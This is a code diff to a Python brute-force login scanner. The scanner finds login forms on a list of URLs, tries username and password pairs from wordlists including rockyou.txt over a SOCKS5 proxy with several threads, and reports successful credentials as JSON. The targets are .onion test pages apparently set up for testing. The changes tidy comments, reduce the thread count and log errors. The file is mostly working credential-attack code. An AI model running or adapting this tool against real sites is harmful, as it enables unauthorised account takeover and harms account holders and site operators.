@@ -4,7 +4,7 @@ from urllib.parse import urljoin
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 import json
-from tqdm import tqdm  # Importa tqdm
+from tqdm import tqdm
 
 usernames_file = "./dics/usernames.txt"
 passwords_file = "./dics/rockyou.txt"
@@ -19,8 +19,8 @@ class AdvancedBruteForceScanner:
             'https': f'socks5h://{proxy_address}:{proxy_port}'
         }
         self.input_name_users = None
-        self.num_threads = 10
-        self.results = {}  # Diccionario para almacenar los resultados
+        self.num_threads = 5
+        self.results = {}  
 
     def get_forms(self, url):
         try:
@@ -54,15 +54,12 @@ class AdvancedBruteForceScanner:
         return details_of_form
 
     def login_successful(self, response):
-        # Define mensajes de éxito
         success_messages = [
             "Inicio de sesión exitoso!",
             "Login successful!",
             "Welcome",
-            # Otros mensajes de éxito que puedan estar presentes
         ]
 
-        # Verifica si alguno de los mensajes está presente en la respuesta
         for message in success_messages:
             if message in response.text:
                 return True
@@ -102,13 +99,20 @@ class AdvancedBruteForceScanner:
                     }
                     self.results.setdefault(url, []).append(result)
         except Exception as e:
-            pass
+            error_message = f"Error: {str(e)}"
+            result = {
+                "url": url,
+                "credentials": credentials,
+                "success": False,
+                "error": error_message
+            }
+            self.results.setdefault(url, []).append(result)
 
     def brute_force(self, usernames_file, passwords_file):
-        for url in tqdm(self.urls, desc="Scanning URLs for Brute Force"):  # Barra de progreso para cada URL
+        for url in tqdm(self.urls, desc="Scanning URLs for Brute Force"):  
             input_names = self.find_login_inputs(url)
             if not input_names:
-                continue  # Si no se pueden encontrar formularios de inicio de sesión, pasar a la siguiente URL
+                continue  
 
             with open(usernames_file, 'r') as user_file:
                 usernames = [line.strip() for line in user_file]
@@ -131,7 +135,6 @@ class AdvancedBruteForceScanner:
             for thread in threads:
                 thread.join()
 
-        # Convertir los resultados a JSON y devolverlos
         if not self.results:
             return json.dumps({"No encontrado fuerza bruta"})
         return json.dumps(self.results)
@@ -147,15 +150,25 @@ class AdvancedBruteForceScanner:
             self.input_name_users = [input_tag.attrs.get("name") for input_tag in login_inputs]
             return input_names
         except requests.exceptions.RequestException as e:
-            print(f"Error: Unable to retrieve content from {url}: {e}")
+            error_message = f"Error: Unable to retrieve content from {url}"
+            result = {
+                "url": url,
+                "error": error_message
+            }
+            self.results.setdefault(url, []).append(result)
             return {}
         except KeyError as ke:
-            print(f"Error: Unable to find form details: {ke}")
+            error_message = f"Error: Unable to find form details in {url}"
+            result = {
+                "url": url,
+                "error": error_message
+            }
+            self.results.setdefault(url, []).append(result)
             return {}
 
 if __name__ == "__main__":
     urls = [
-        "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_bruteforce/prueba_bruteforce.html",
+        "http://kz62gxxle6gswe5t6iv6wjt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_bruteforce/prueba_bruteforce.html","http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_bruteforce/prueba_bruteforce.html"
         # Add more URLs here if needed
     ]
     scanner = AdvancedBruteForceScanner(urls)
